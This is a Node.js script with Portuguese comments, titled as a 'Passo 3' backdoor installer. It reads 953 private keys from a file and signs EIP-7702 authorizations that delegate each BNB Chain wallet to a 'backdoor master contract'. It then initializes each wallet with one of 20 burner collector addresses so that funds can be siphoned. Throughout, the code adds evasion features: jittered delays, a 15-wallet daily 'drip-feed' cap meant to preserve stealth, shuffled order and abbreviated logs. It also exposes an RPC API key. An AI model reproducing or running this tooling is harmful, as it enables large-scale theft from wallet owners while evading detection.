// sniper_passo3_backdoor.js - VERSÃO FINAL OTIMIZADA (NÍVEL APT)
const { ethers } = require("ethers");
const fs = require("fs");
const crypto = require("crypto");

const CONFIG = {
    // 🔑 SUAS 953 CHAVES (O PODER ABSOLUTO)
    arquivoChaves: 'chaves_953.txt',
    
    // 🎯 SEU CONTRATO BACKDOOR MESTRE (ÚNICO DEPLOY)
    // AGORA COM FUNÇÃO initialize(address collector)
    contratoBackdoor: '0xSEU_CONTRATO_MESTRE_AQUI',
    contratoVersao: 1,
    
    // 🏦 WALLETS BURNER (20 coletores diferentes)
    // Cada grupo de ~50 wallets usa uma burner diferente
    walletsBurner: [
        '0xBurner01...', // Grupo 0: wallets 000-049
        '0xBurner02...', // Grupo 1: wallets 050-099
        '0xBurner03...', // Grupo 2: wallets 100-149
        '0xBurner04...', // Grupo 3: wallets 150-199
        '0xBurner05...', // Grupo 4: wallets 200-249
        '0xBurner06...', // Grupo 5: wallets 250-299
        '0xBurner07...', // Grupo 6: wallets 300-349
        '0xBurner08...', // Grupo 7: wallets 350-399
        '0xBurner09...', // Grupo 8: wallets 400-449
        '0xBurner10...', // Grupo 9: wallets 450-499
        '0xBurner11...', // Grupo 10: wallets 500-549
        '0xBurner12...', // Grupo 11: wallets 550-599
        '0xBurner13...', // Grupo 12: wallets 600-649
        '0xBurner14...', // Grupo 13: wallets 650-699
        '0xBurner15...', // Grupo 14: wallets 700-749
        '0xBurner16...', // Grupo 15: wallets 750-799
        '0xBurner17...', // Grupo 16: wallets 800-849
        '0xBurner18...', // Grupo 17: wallets 850-899
        '0xBurner19...', // Grupo 18: wallets 900-949
        '0xBurner20...'  // Grupo 19: wallets 950-953
    ],
    
    // ⚙️ CONFIGURAÇÃO DE GRUPOS
    tamanhoGrupo: 50, // Quantas wallets por burner
    
    // 🚀 POOL DE RPCS - ESTRATÉGICO
    rpcPool: {
        premium: [
            'https://go.getblock.us/892978f53ec64cf591cea37589ca5ae9',
            'https://bsc.getblock.io/mainnet/?api_key=892978f53ec64cf591cea37589ca5ae9'
        ],
        public: [
            'https://bsc-dataseed1.binance.org/',
            'https://bsc-dataseed2.binance.org/',
            'https://bsc-dataseed3.binance.org/',
            'https://bsc-dataseed4.binance.org/',
            'https://bsc-dataseed1.defibit.io/',
            'https://bsc-dataseed2.defibit.io/',
            'https://bsc-dataseed1.ninicoin.io/',
            'https://bsc-dataseed2.ninicoin.io/',
            'https://rpc.ankr.com/bsc',
            'https://binance.nodereal.io'
        ]
    },
    
    // ⚙️ CONFIGURAÇÕES DO PASSO 3
    gasMultiplier: 120, // 20% mais caro (garante confirmação)
    gasLimit: 50000,    // Suficiente para EIP-7702
    gasLimitInit: 30000, // Gas para chamar initialize (depois do 7702)
    chainId: 56,        // BSC Mainnet
    
    // ⏱️ TIMINGS (COM JITTER PARA EVITAR PADRÕES)
    delayBase: 1000,    // 1 segundo base
    delayJitterMax: 3000, // + até 3 segundos aleatórios
    txTimeout: 60000,   // 60 segundos timeout por transação
    
    // 🥷 ESTRATÉGIA DE GOTEJAMENTO (DRIP-FEED)
    metaDiaria: 15,            // Quantas wallets processar por execução
    tempoEntreSessoes: 86400000, // 24 horas
    pausaAposMeta: true,       // Para o script após atingir a meta
    arquivoSessao: 'ultima_sessao.json',
    
    // 📁 CHECKPOINT E LOGS
    arquivoLog: 'backdoor_instaladas.log',
    arquivoLogFalhas: 'falhas_detalhadas.log',
    arquivoCheckpoint: 'checkpoint_backdoor.json',
    arquivoSaldoZero: 'wallets_sem_saldo.log',
    arquivoRpcErrors: 'rpc_errors.log',
    arquivoGrupos: 'grupos_coletores.log', // NOVO: Log de qual grupo usou qual burner
    
    // 🔇 MODO SILENCIOSO (true = não exibe endereços completos)
    modoSilencioso: true,
    
    // 🛡️ PROTEÇÕES
    maxConcurrentLocks: 50,
    retryAttempts: 3,
    
    // 📊 ESTATÍSTICAS DE RPC
    rpcStats: true,
};

class SniperPasso3 {
    constructor() {
        // Inicializa providers PREMIUM (GetBlock)
        this.premiumProviders = CONFIG.rpcPool.premium.map(url => 
            new ethers.providers.JsonRpcProvider(url)
        );
        
        // Inicializa providers PÚBLICOS (Binance, etc)
        this.publicProviders = CONFIG.rpcPool.public.map(url => 
            new ethers.providers.JsonRpcProvider(url)
        );
        
        // Estatísticas de uso de RPC
        this.rpcUsage = {
            premium: { used: 0, successes: 0, failures: 0 },
            public: { used: 0, successes: 0, failures: 0 }
        };
        
        // Controle de nonces em uso (lock)
        this.noncesEmUso = new Map();
        
        // Cache de nonces
        this.nonceCache = new Map();
        
        // Estatísticas detalhadas
        this.stats = {
            inicio: Date.now(),
            tentativas: 0,
            sucessos: 0,
            falhas: 0,
            falhasNonce: 0,
            falhasTimeout: 0,
            falhasRPC: 0,
            semSaldo: 0,
            walletsProcessadas: new Set(),
            // NOVO: Estatísticas por grupo
            grupos: {}
        };
        
        this.chaves = [];
        this.instaladas = 0;
        this.processando = false;
    }
    
    // 🎯 FUNÇÃO PARA LOG SILENCIOSO
    log(msg, tipo = 'info') {
        const timestamp = new Date().toLocaleTimeString();
        const icons = {
            sucesso: '✅',
            erro: '❌',
            aviso: '⚠️',
            info: '📌',
            stealth: '🥷',
            premium: '💎',
            public: '🌐',
            meta: '🎯',
            burner: '🔥',
            init: '⚙️'
        };
        
        console.log(`${icons[tipo] || '•'} ${timestamp} - ${msg}`);
    }
    
    // 🎲 RPC PARA TRANSAÇÕES CRÍTICAS (USAR PREMIUM)
    getPremiumProvider() {
        const idx = Math.floor(Math.random() * this.premiumProviders.length);
        this.rpcUsage.premium.used++;
        return this.premiumProviders[idx];
    }
    
    // 🎲 RPC PARA CONSULTAS (USAR PÚBLICO)
    getPublicProvider() {
        const idx = Math.floor(Math.random() * this.publicProviders.length);
        this.rpcUsage.public.used++;
        return this.publicProviders[idx];
    }
    
    // ⏱️ DELAY COM JITTER (EVITA PADRÕES)
    async delayJitter() {
        const jitter = Math.floor(Math.random() * CONFIG.delayJitterMax);
        const delay = CONFIG.delayBase + jitter;
        
        if (Math.random() < 0.1) {
            await new Promise(r => setTimeout(r, delay * 2));
        } else {
            await new Promise(r => setTimeout(r, delay));
        }
    }
    
    // 🛡️ VERIFICAÇÃO DE SALDO PRÉVIA (USA RPC PÚBLICO)
    async verificarSaldo(wallet) {
        const provider = this.getPublicProvider();
        
        try {
            const balance = await provider.getBalance(wallet.address);
            
            // Estima custo de gas com margem (agora considera 2 transações: 7702 + initialize)
            const gasPrice = await provider.getGasPrice();
            const custoGas7702 = gasPrice
                .mul(CONFIG.gasLimit)
                .mul(CONFIG.gasMultiplier)
                .div(100);
            
            const custoGasInit = gasPrice
                .mul(CONFIG.gasLimitInit)
                .mul(CONFIG.gasMultiplier)
                .div(100);
            
            const custoTotal = custoGas7702.add(custoGasInit);
            
            // Margem de segurança (10% extra)
            const custoComMargem = custoTotal.mul(110).div(100);
            
            this.rpcUsage.public.successes++;
            
            return {
                temSaldo: !balance.eq(0),
                saldoSuficiente: balance.gte(custoComMargem),
                balance: ethers.utils.formatEther(balance),
                custoGas: ethers.utils.formatEther(custoTotal),
                balanceWei: balance,
                custoWei: custoTotal
            };
            
        } catch (e) {
            this.rpcUsage.public.failures++;
            
            const rpcError = `${new Date().toISOString()} | PUBLIC | ${e.message.substring(0, 100)}\n`;
            fs.appendFileSync(CONFIG.arquivoRpcErrors, rpcError);
            
            this.log(`Erro em RPC público: ${e.message.substring(0, 50)}`, 'aviso');
            
            if (this.rpcUsage.public.failures % 3 === 0) {
                this.log(`🔄 Múltiplas falhas em públicos, tentando premium para consulta`, 'aviso');
                return this.verificarSaldoPremium(wallet);
            }
            
            return {
                temSaldo: false,
                saldoSuficiente: false,
                erro: e.message
            };
        }
    }
    
    // 🛡️ VERIFICAÇÃO DE SALDO COM PREMIUM (BACKUP)
    async verificarSaldoPremium(wallet) {
        const provider = this.getPremiumProvider();
        
        try {
            const balance = await provider.getBalance(wallet.address);
            
            const gasPrice = await provider.getGasPrice();
            const custoGas7702 = gasPrice
                .mul(CONFIG.gasLimit)
                .mul(CONFIG.gasMultiplier)
                .div(100);
            
            const custoGasInit = gasPrice
                .mul(CONFIG.gasLimitInit)
                .mul(CONFIG.gasMultiplier)
                .div(100);
            
            const custoTotal = custoGas7702.add(custoGasInit);
            const custoComMargem = custoTotal.mul(110).div(100);
            
            this.rpcUsage.premium.successes++;
            
            return {
                temSaldo: !balance.eq(0),
                saldoSuficiente: balance.gte(custoComMargem),
                balance: ethers.utils.formatEther(balance),
                custoGas: ethers.utils.formatEther(custoTotal),
                balanceWei: balance,
                custoWei: custoTotal
            };
            
        } catch (e) {
            this.rpcUsage.premium.failures++;
            return {
                temSaldo: false,
                saldoSuficiente: false,
                erro: e.message
            };
        }
    }
    
    // 🔒 OBTÉM NONCE (USA RPC PÚBLICO - CONSULTA)
    async getNonceComLock(endereco) {
        if (this.noncesEmUso.has(endereco)) {
            const lockInfo = this.noncesEmUso.get(endereco);
            if (Date.now() - lockInfo.timestamp < 30000) {
                return { nonce: null, locked: true, info: lockInfo };
            } else {
                this.noncesEmUso.delete(endereco);
            }
        }
        
        const provider = this.getPublicProvider();
        
        try {
            const nonce = await provider.getTransactionCount(endereco);
            
            this.noncesEmUso.set(endereco, {
                nonce: nonce,
                timestamp: Date.now(),
                attempts: 0
            });
            
            this.nonceCache.set(endereco, {
                nonce: nonce,
                timestamp: Date.now()
            });
            
            this.rpcUsage.public.successes++;
            
            return { nonce, locked: false };
            
        } catch (e) {
            this.rpcUsage.public.failures++;
            
            this.log(`Falha ao obter nonce via público, tentando premium`, 'aviso');
            
            const premiumProvider = this.getPremiumProvider();
            const nonce = await premiumProvider.getTransactionCount(endereco);
            
            this.rpcUsage.premium.successes++;
            
            this.noncesEmUso.set(endereco, {
                nonce: nonce,
                timestamp: Date.now(),
                attempts: 0
            });
            
            return { nonce, locked: false };
        }
    }
    
    // 🔓 LIBERA LOCK
    releaseLock(endereco, sucesso = true) {
        if (this.noncesEmUso.has(endereco)) {
            const lockInfo = this.noncesEmUso.get(endereco);
            
            if (sucesso) {
                lockInfo.nonce++;
                lockInfo.timestamp = Date.now();
                lockInfo.attempts = 0;
            } else {
                lockInfo.attempts++;
                
                if (lockInfo.attempts >= CONFIG.retryAttempts) {
                    this.noncesEmUso.delete(endereco);
                    return;
                }
            }
            
            this.noncesEmUso.set(endereco, lockInfo);
        }
    }
    
    /**
     * 🎯 NOVA FUNÇÃO: Inicializar coletor na wallet recém-injetada
     * Chama o initialize do contrato mestre passando a burner específica
     */
    async inicializarColetor(wallet, burnerAddress, nonceAtual, tentativa = 1) {
        try {
            const premiumProvider = this.getPremiumProvider();
            const walletComRPC = wallet.connect(premiumProvider);
            
            // Interface do contrato mestre (apenas a função initialize)
            const iface = new ethers.utils.Interface([
                "function initialize(address collector) external"
            ]);
            
            // Prepara dados da chamada
            const data = iface.encodeFunctionData("initialize", [burnerAddress]);
            
            // Prepara transação
            const gasPrice = (await premiumProvider.getGasPrice())
                .mul(CONFIG.gasMultiplier)
                .div(100);
            
            // Envia transação de inicialização
            const tx = await walletComRPC.sendTransaction({
                to: CONFIG.contratoBackdoor, // Chama o próprio contrato
                data: data,
                gasPrice: gasPrice,
                gasLimit: CONFIG.gasLimitInit,
                nonce: nonceAtual
            });
            
            // Aguarda confirmação
            await tx.wait();
            
            const endAbrev = wallet.address.substring(0, 6) + '...' + wallet.address.substring(38);
            const burnerAbrev = burnerAddress.substring(0, 6) + '...' + burnerAddress.substring(38);
            this.log(`⚙️ Inicializado ${endAbrev} → Burner ${burnerAbrev} | TX: ${tx.hash.substring(0, 10)}...`, 'init');
            
            return { sucesso: true, tx: tx.hash };
            
        } catch (e) {
            if (tentativa < CONFIG.retryAttempts) {
                this.log(`🔄 Tentativa ${tentativa + 1}/${CONFIG.retryAttempts} de inicialização`, 'aviso');
                await this.delayJitter();
                return this.inicializarColetor(wallet, burnerAddress, nonceAtual, tentativa + 1);
            }
            
            this.log(`❌ Falha na inicialização: ${e.message.substring(0, 50)}`, 'erro');
            return { sucesso: false, erro: e.message };
        }
    }
    
    /**
     * 🔥 NOVO: Calcula grupo e burner para cada wallet
     */
    getGrupoEBurner(indice) {
        const grupo = Math.floor(indice / CONFIG.tamanhoGrupo);
        const burnerIndex = grupo % CONFIG.walletsBurner.length;
        return {
            grupo,
            burner: CONFIG.walletsBurner[burnerIndex],
            burnerIndex
        };
    }
    
    /**
     * 📝 NOVO: Log do grupo
     */
    logGrupo(endereco, indice, grupo, burner) {
        if (!this.stats.grupos[grupo]) {
            this.stats.grupos[grupo] = 0;
        }
        this.stats.grupos[grupo]++;
        
        const logLine = `${new Date().toISOString()} | Wallet: ${endereco} | Índice: ${indice} | Grupo: ${grupo} | Burner: ${burner}\n`;
        fs.appendFileSync(CONFIG.arquivoGrupos, logLine);
    }
    
    // 🎯 PASSO 3: INSTALAR BACKDOOR (COM INICIALIZAÇÃO PÓS-7702)
    async instalarBackdoor(item, indice, tentativa = 1) {
        this.stats.tentativas++;
        
        // 🔥 Determina grupo e burner para esta wallet
        const { grupo, burner } = this.getGrupoEBurner(indice);
        
        // USA PREMIUM PARA A TRANSAÇÃO CRÍTICA
        const premiumProvider = this.getPremiumProvider();
        const walletComRPC = item.wallet.connect(premiumProvider);
        
        try {
            // 1. VERIFICA SALDO (agora considerando 2 transações)
            const saldoInfo = await this.verificarSaldo(item.wallet);
            
            if (!saldoInfo.temSaldo) {
                this.stats.semSaldo++;
                
                const logSaldo = `${new Date().toISOString()} | ${item.endereco} | SEM SALDO\n`;
                fs.appendFileSync(CONFIG.arquivoSaldoZero, logSaldo);
                
                const endAbrev = item.endereco.substring(0, 6) + '...' + item.endereco.substring(38);
                this.log(`Wallet sem saldo: ${endAbrev}`, 'aviso');
                
                return { 
                    sucesso: false, 
                    erro: 'sem_saldo',
                    recoverable: false 
                };
            }
            
            if (!saldoInfo.saldoSuficiente) {
                this.stats.semSaldo++;
                
                const endAbrev = item.endereco.substring(0, 6) + '...' + item.endereco.substring(38);
                this.log(`Saldo insuficiente: ${endAbrev} (tem ${saldoInfo.balance}, precisa ~${saldoInfo.custoGas})`, 'aviso');
                
                return { 
                    sucesso: false, 
                    erro: 'saldo_insuficiente',
                    recoverable: false 
                };
            }
            
            // 2. OBTÉM NONCE ATUAL (para a transação 7702)
            const { nonce, locked } = await this.getNonceComLock(item.endereco);
            
            if (locked) {
                this.log(`Wallet em uso: ${item.endereco.substring(0, 10)}... aguardando`, 'aviso');
                await this.delayJitter();
                return this.instalarBackdoor(item, indice, tentativa);
            }
            
            // 3. ASSINA AUTORIZAÇÃO EIP-7702
            const auth = await walletComRPC.signAuthorization({
                chainId: CONFIG.chainId,
                address: CONFIG.contratoBackdoor,
                nonce: nonce
            });
            
            // 4. PREPARA TRANSAÇÃO 7702
            const gasPrice = (await premiumProvider.getGasPrice())
                .mul(CONFIG.gasMultiplier)
                .div(100);
            
            const txId = crypto.randomBytes(4).toString('hex');
            
            this.log(`💎 Enviando TX ${txId} para ${item.endereco.substring(0, 10)}... | Grupo: ${grupo} | Nonce: ${nonce}`, 'premium');
            
            // 5. ENVIA TRANSAÇÃO 7702
            const txPromise = walletComRPC.sendTransaction({
                to: item.endereco,
                value: 0,
                gasPrice: gasPrice,
                gasLimit: CONFIG.gasLimit,
                nonce: nonce,
                authorizationList: [auth]
            });
            
            const tx = await Promise.race([
                txPromise,
                new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('timeout')), CONFIG.txTimeout)
                )
            ]);
            
            // 6. AGUARDA CONFIRMAÇÃO DA 7702
            const receipt7702 = await Promise.race([
                tx.wait(),
                new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('confirmation_timeout')), CONFIG.txTimeout)
                )
            ]);
            
            // 7. 🔥 INICIALIZA O COLETOR (chama initialize com a burner)
            const initResult = await this.inicializarColetor(
                item.wallet, 
                burner, 
                nonce + 1 // Próximo nonce
            );
            
            if (!initResult.sucesso) {
                this.log(`⚠️ 7702 OK mas initialize falhou: ${item.endereco.substring(0, 10)}...`, 'aviso');
                // Continua - o backdoor ainda funciona? Depende do contrato
            }
            
            // 8. SUCESSO COMPLETO!
            this.stats.sucessos++;
            this.rpcUsage.premium.successes++;
            this.stats.walletsProcessadas.add(item.endereco);
            
            // Log do grupo
            this.logGrupo(item.endereco, indice, grupo, burner);
            
            // Log silencioso
            if (CONFIG.modoSilencioso) {
                const endAbrev = item.endereco.substring(0, 6) + '...' + item.endereco.substring(38);
                this.log(`✅ Backdoor ${endAbrev} | Grupo: ${grupo} | TX: ${tx.hash.substring(0, 10)}... | Nonce: ${nonce}`, 'sucesso');
            } else {
                this.log(`✅ Backdoor ${item.endereco} | Grupo: ${grupo} | TX: ${tx.hash} | Nonce: ${nonce}`, 'sucesso');
            }
            
            // Libera lock com sucesso
            this.releaseLock(item.endereco, true);
            
            return { 
                sucesso: true, 
                tx: tx.hash, 
                nonce: nonce + 2, // Gastamos 2 nonces (7702 + initialize)
                gasUsed: receipt7702.gasUsed.toString(),
                grupo
            };
            
        } catch (e) {
            // Libera lock com falha
            this.releaseLock(item.endereco, false);
            this.rpcUsage.premium.failures++;
            
            // Classifica o erro
            let erroTipo = 'desconhecido';
            let recoverable = false;
            
            if (e.message.includes('nonce')) {
                erroTipo = 'nonce';
                this.stats.falhasNonce++;
                recoverable = true;
            } else if (e.message.includes('timeout')) {
                erroTipo = 'timeout';
                this.stats.falhasTimeout++;
                recoverable = true;
            } else if (e.message.includes('rate limit') || e.message.includes('429')) {
                erroTipo = 'rate_limit';
                this.stats.falhasRPC++;
                recoverable = true;
            } else {
                this.stats.falhas++;
            }
            
            // Log detalhado
            const erroDetalhado = {
                timestamp: new Date().toISOString(),
                endereco: item.endereco,
                erro: e.message,
                tipo: erroTipo,
                tentativa: tentativa,
                recoverable: recoverable,
                txId: txId || null,
                grupo
            };
            
            fs.appendFileSync(CONFIG.arquivoLogFalhas, JSON.stringify(erroDetalhado) + '\n');
            
            // Log resumido
            const endAbrev = item.endereco.substring(0, 10) + '...';
            this.log(`❌ Falha ${endAbrev} [Grupo: ${grupo}]: ${e.message.substring(0, 50)} [${erroTipo}]`, 'erro');
            
            // Tenta novamente
            if (recoverable && tentativa < CONFIG.retryAttempts) {
                this.log(`🔄 Tentativa ${tentativa + 1}/${CONFIG.retryAttempts} para ${endAbrev}`, 'aviso');
                await this.delayJitter();
                return this.instalarBackdoor(item, indice, tentativa + 1);
            }
            
            return { 
                sucesso: false, 
                erro: e.message,
                tipo: erroTipo,
                recoverable: recoverable
            };
        }
    }
    
    // 📊 RELATÓRIO DE USO DE RPC
    gerarRelatorioRPC() {
        const premiumSuccessRate = this.rpcUsage.premium.used > 0 
            ? ((this.rpcUsage.premium.successes / this.rpcUsage.premium.used) * 100).toFixed(1)
            : 'N/A';
            
        const publicSuccessRate = this.rpcUsage.public.used > 0
            ? ((this.rpcUsage.public.successes / this.rpcUsage.public.used) * 100).toFixed(1)
            : 'N/A';
        
        return {
            premium: {
                usos: this.rpcUsage.premium.used,
                sucessos: this.rpcUsage.premium.successes,
                falhas: this.rpcUsage.premium.failures,
                taxaSucesso: premiumSuccessRate + '%'
            },
            public: {
                usos: this.rpcUsage.public.used,
                sucessos: this.rpcUsage.public.successes,
                falhas: this.rpcUsage.public.failures,
                taxaSucesso: publicSuccessRate + '%'
            }
        };
    }
    
    // 📊 RELATÓRIO PARCIAL
    gerarRelatorioParcial(processadas, total, sessaoAtual) {
        const tempoDecorrido = (Date.now() - this.stats.inicio) / 1000;
        const velocidade = processadas / (tempoDecorrido / 60);
        const tempoRestante = (total - processadas) / velocidade;
        
        return {
            processadas,
            total,
            percentual: ((processadas / total) * 100).toFixed(1),
            velocidade: velocidade.toFixed(2),
            etaMin: tempoRestante.toFixed(1),
            sucessos: this.stats.sucessos,
            falhas: this.stats.falhas,
            semSaldo: this.stats.semSaldo,
            sessaoAtual
        };
    }
    
    // 📝 SALVAR CONTROLE DE SESSÃO
    salvarControleSessao() {
        const controle = {
            ultimaExecucao: new Date().toISOString(),
            walletsProcessadasHoje: this.stats.sucessos,
            metaDiaria: CONFIG.metaDiaria
        };
        fs.writeFileSync(CONFIG.arquivoSessao, JSON.stringify(controle, null, 2));
    }
    
    async carregarChaves() {
        console.log("\n" + "=".repeat(80));
        console.log("🥷 SNIPER PASSO 3 - BACKDOOR SILENCIOSO (NÍVEL APT)");
        console.log("=".repeat(80));
        console.log(`📦 Contrato Mestre: ${CONFIG.contratoBackdoor}`);
        console.log(`🔥 Wallets Burner: ${CONFIG.walletsBurner.length} (1 por grupo de ${CONFIG.tamanhoGrupo})`);
        console.log(`💎 RPC Premium: ${CONFIG.rpcPool.premium.length} endpoints (GetBlock - TRANSAÇÕES)`);
        console.log(`🌐 RPC Público: ${CONFIG.rpcPool.public.length} endpoints (CONSULTAS)`);
        console.log(`🎯 META DIÁRIA: ${CONFIG.metaDiaria} wallets (MODO GOTEJAMENTO)`);
        console.log(`🔇 MODO: Instalação furtiva + Inicialização de coletores\n`);
        
        // Carrega checkpoint
        let checkpoint = {};
        if (fs.existsSync(CONFIG.arquivoCheckpoint)) {
            checkpoint = JSON.parse(fs.readFileSync(CONFIG.arquivoCheckpoint));
            this.log(`📌 Checkpoint carregado: ${Object.keys(checkpoint).length} wallets já processadas`);
            
            Object.keys(checkpoint).forEach(addr => {
                this.stats.walletsProcessadas.add(addr);
            });
        }
        
        // Carrega arquivo de chaves
        if (!fs.existsSync(CONFIG.arquivoChaves)) {
            this.log(`❌ Arquivo de chaves não encontrado: ${CONFIG.arquivoChaves}`, 'erro');
            process.exit(1);
        }
        
        const conteudo = fs.readFileSync(CONFIG.arquivoChaves, 'utf8');
        const linhas = conteudo.split('\n').filter(l => l.trim());
        
        let validas = 0;
        for (const linha of linhas) {
            const chave = linha.trim();
            try {
                const wallet = new ethers.Wallet(chave);
                const endereco = wallet.address;
                
                if (checkpoint[endereco] || this.stats.walletsProcessadas.has(endereco)) {
                    this.instaladas++;
                    continue;
                }
                
                this.chaves.push({
                    chave,
                    wallet,
                    endereco,
                    instalada: false,
                    tentativas: 0
                });
                validas++;
                
            } catch (e) {
                this.log(`Chave inválida: ${chave.substring(0, 10)}...`, 'aviso');
                this.falhas++;
            }
        }
        
        this.log(`📊 Total de chaves: ${linhas.length}`);
        this.log(`📊 Válidas: ${validas}`);
        this.log(`📊 Já instaladas: ${this.instaladas}`);
        this.log(`📊 Pendentes: ${this.chaves.length}`);
        this.log(`📊 Inválidas: ${this.falhas}\n`);
        
        this.chaves = this.chaves.sort(() => Math.random() - 0.5);
    }
    
    async executar() {
        await this.carregarChaves();
        
        if (this.chaves.length === 0) {
            this.log("✅ TODAS AS CHAVES JÁ FORAM INSTALADAS!", 'sucesso');
            this.gerarRelatorioFinal();
            return;
        }
        
        this.log(`🔧 Instalando backdoor em ${this.chaves.length} chaves restantes...`);
        this.log(`🎯 META DE HOJE: ${CONFIG.metaDiaria} wallets (gotejamento)\n`);
        
        let checkpoint = {};
        if (fs.existsSync(CONFIG.arquivoCheckpoint)) {
            checkpoint = JSON.parse(fs.readFileSync(CONFIG.arquivoCheckpoint));
        }
        
        let processadas = 0;
        let sucessos = 0;
        let processadasNestaSessao = 0;
        
        for (let i = 0; i < this.chaves.length; i++) {
            const item = this.chaves[i];
            
            // Verifica meta diária
            if (processadasNestaSessao >= CONFIG.metaDiaria) {
                this.log(`🎯 META DIÁRIA DE ${CONFIG.metaDiaria} ATINGIDA! Parando execução para manter o stealth.`, 'meta');
                this.log(`🥷 Próxima execução: +24h (ou quando reexecutar o script)`, 'stealth');
                
                this.salvarControleSessao();
                break;
            }
            
            processadas++;
            
            if (processadas % 5 === 0 || processadas === 1) {
                const rel = this.gerarRelatorioParcial(processadas, this.chaves.length, processadasNestaSessao);
                console.log(`\n📈 [${rel.processadas}/${rel.total}] ${rel.percentual}% | ` +
                    `Hoje: ${rel.sessaoAtual}/${CONFIG.metaDiaria} | ` +
                    `Vel: ${rel.velocidade} wallets/min | ETA: ${rel.etaMin} min | ` +
                    `✅ ${rel.sucessos} | ❌ ${rel.falhas} | 💰 Sem saldo: ${rel.semSaldo}\n`);
            }
            
            // Passa o índice para o cálculo do grupo
            const resultado = await this.instalarBackdoor(item, i);
            
            if (resultado.sucesso) {
                sucessos++;
                processadasNestaSessao++;
                item.instalada = true;
                
                checkpoint[item.endereco] = {
                    nonce: resultado.nonce,
                    tx: resultado.tx,
                    grupo: resultado.grupo,
                    timestamp: new Date().toISOString()
                };
                
                fs.writeFileSync(CONFIG.arquivoCheckpoint, JSON.stringify(checkpoint, null, 2));
                
                const logLine = `${new Date().toISOString()} | ${item.endereco} | TX: ${resultado.tx} | NONCE: ${resultado.nonce} | GAS: ${resultado.gasUsed} | GRUPO: ${resultado.grupo}\n`;
                fs.appendFileSync(CONFIG.arquivoLog, logLine);
            }
            
            // Pausa estratégica a cada 10 sucessos da sessão
            if (processadasNestaSessao % 10 === 0 && processadasNestaSessao > 0 && processadasNestaSessao < CONFIG.metaDiaria) {
                const pausa = Math.floor(Math.random() * 30000) + 30000;
                this.log(`⏸️ Pausa estratégica de ${Math.round(pausa/1000)} segundos... (${processadasNestaSessao}/${CONFIG.metaDiaria})`, 'aviso');
                await new Promise(r => setTimeout(r, pausa));
            }
            
            await this.delayJitter();
        }
        
        if (processadasNestaSessao < CONFIG.metaDiaria && this.chaves.length > 0) {
            this.log(`📌 Fim da fila de wallets pendentes. Próxima execução continuará.`, 'info');
            this.salvarControleSessao();
        }
        
        this.gerarRelatorioFinal();
    }
    
    gerarRelatorioFinal() {
        const tempoTotal = (Date.now() - this.stats.inicio) / 1000 / 60;
        const rpcStats = this.gerarRelatorioRPC();
        
        console.log("\n" + "=".repeat(80));
        console.log("📊 RELATÓRIO FINAL - PASSO 3 (NÍVEL APT)");
        console.log("=".repeat(80));
        console.log(`✅ Backdoors instaladas HOJE: ${this.stats.sucessos}`);
        console.log(`📦 Total acumulado: ${this.instaladas + this.stats.sucessos}/${this.instaladas + this.chaves.length + this.stats.sucessos}`);
        console.log(`❌ Falhas totais: ${this.stats.falhas}`);
        console.log(`   ├─ Falhas de nonce: ${this.stats.falhasNonce}`);
        console.log(`   ├─ Timeouts: ${this.stats.falhasTimeout}`);
        console.log(`   ├─ Erros RPC: ${this.stats.falhasRPC}`);
        console.log(`   └─ Outras: ${this.stats.falhas - (this.stats.falhasNonce + this.stats.falhasTimeout + this.stats.falhasRPC)}`);
        console.log(`💰 Wallets sem saldo: ${this.stats.semSaldo}`);
        console.log(`⏱️ Tempo hoje: ${tempoTotal.toFixed(2)} minutos`);
        
        // Estatísticas por grupo
        if (Object.keys(this.stats.grupos).length > 0) {
            console.log("\n" + "📊 DISTRIBUIÇÃO POR GRUPO");
            for (let g = 0; g < Math.ceil(953 / CONFIG.tamanhoGrupo); g++) {
                if (this.stats.grupos[g]) {
                    console.log(`   🔥 Grupo ${g}: ${this.stats.grupos[g]} wallets → Burner ${CONFIG.walletsBurner[g % CONFIG.walletsBurner.length].substring(0, 10)}...`);
                }
            }
        }
        
        console.log("\n" + "📊 ESTATÍSTICAS DE RPC");
        console.log(`   💎 PREMIUM (GetBlock):`);
        console.log(`      ├─ Usos: ${rpcStats.premium.usos}`);
        console.log(`      ├─ Sucessos: ${rpcStats.premium.sucessos}`);
        console.log(`      ├─ Falhas: ${rpcStats.premium.falhas}`);
        console.log(`      └─ Taxa de sucesso: ${rpcStats.premium.taxaSucesso}`);
        console.log(`   🌐 PÚBLICO (Binance, etc):`);
        console.log(`      ├─ Usos: ${rpcStats.public.usos}`);
        console.log(`      ├─ Sucessos: ${rpcStats.public.sucessos}`);
        console.log(`      ├─ Falhas: ${rpcStats.public.falhas}`);
        console.log(`      └─ Taxa de sucesso: ${rpcStats.public.taxaSucesso}`);
        console.log("=".repeat(80));
        console.log(`\n🥷 ESTRATÉGIA DE GOTEJAMENTO ATIVA:`);
        console.log(`   • Meta diária: ${CONFIG.metaDiaria} wallets`);
        console.log(`   • Execução atual: ${this.stats.sucessos} processadas`);
        console.log(`\n🎯 Contrato Mestre: ${CONFIG.contratoBackdoor}`);
        console.log(`🔥 Total de Burners: ${CONFIG.walletsBurner.length}`);
        console.log(`💰 Self-fueling ativo: 10% da taxa fica na wallet para gás`);
        console.log(`   • Investimento inicial: ${ethers.utils.formatEther(CONFIG.gasInicial || ethers.utils.parseEther("0.0005"))} BNB por wallet`);
        console.log(`   • Auto-sustentável após primeira transação\n`);
    }
}

// 🚀 EXECUÇÃO
process.on('unhandledRejection', (error) => {
    console.error('\n❌ ERRO NÃO TRATADO:', error);
});

console.clear();
new SniperPasso3().executar().catch(e => {
    console.error('Erro fatal:', e);
    process.exit(1);
});